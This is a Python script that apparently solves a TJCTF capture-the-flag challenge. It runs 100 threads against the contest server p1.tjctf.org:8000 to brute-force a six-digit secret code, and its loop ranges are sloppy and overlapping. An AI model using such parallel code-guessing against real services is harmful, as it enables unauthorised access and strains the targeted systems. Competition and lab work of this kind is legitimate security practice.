import socket
import threading
import time

# https://gist.github.com/leonjza/f35a7252babdf77c8421 
class Netcat:

    """ Python 'netcat like' module """

    def __init__(self, ip, port):

        self.buff = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length = 1024):

        """ Read 1024 bytes off the socket """

        return self.socket.recv(length)
 
    def read_until(self, data):

        """ Read data into the buffer until we have data """

        while not data in self.buff:
            self.buff += self.socket.recv(1024)
 
        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]
 
        return rval
 
    def write(self, data):

        self.socket.send(data)

    def writeln(self, data):

        data += b"\n"
        self.socket.send(data)

    def close(self):

        self.socket.close()

class SolverThread(threading.Thread):
    def run(self):
        thread_number = int(threading.currentThread().getName())
        self.do_the_stuff(10000, thread_number)

    def do_the_stuff(self, cracking_range, thread_number):
        nc = Netcat('p1.tjctf.org', 8000)
        for x in range(cracking_range * thread_number, cracking_range *
                (thread_number + 10000)):
            nc.buff = b''
            print(nc.read_until(b">"))
            nc.writeln(str.encode("r"))
            nc.read_until(b"Secret")
            nc.writeln(str.encode("tjctf"))
            nc.read_until(b"Secret")
            print(str(x).zfill(6))
            nc.writeln(str.encode(str(x).zfill(6)))

def main():
    for x in range(100):
        thread = SolverThread(name = "{}".format(x + 1))
        thread.daemon = True # allow us to Ctrl+C to kill all threads
        thread.start()
    while True:
        time.sleep(1)

if __name__ == '__main__':
    main()

